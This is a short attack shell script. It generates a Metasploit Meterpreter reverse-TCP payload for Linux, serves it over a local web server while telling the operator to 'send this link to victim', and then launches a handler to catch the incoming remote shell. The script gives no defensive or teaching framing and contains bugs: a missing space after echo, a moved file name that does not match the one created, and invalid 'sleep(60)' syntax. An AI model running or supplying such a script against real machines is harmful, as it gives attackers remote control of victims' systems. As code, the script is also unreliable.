echo"generating payload"
cd /opt/metasploit-framework/
sudo ./msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=4444 -f elf -o reverse.elf
sudo mv reverse.exe ~/temp 
cd ~/temp
echo "send this link to victim"
python3 -m http.server
sleep(60)
cd /opt/metasploit-framework/
sudo ./msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost $HOST; set lport 4444; exploit"
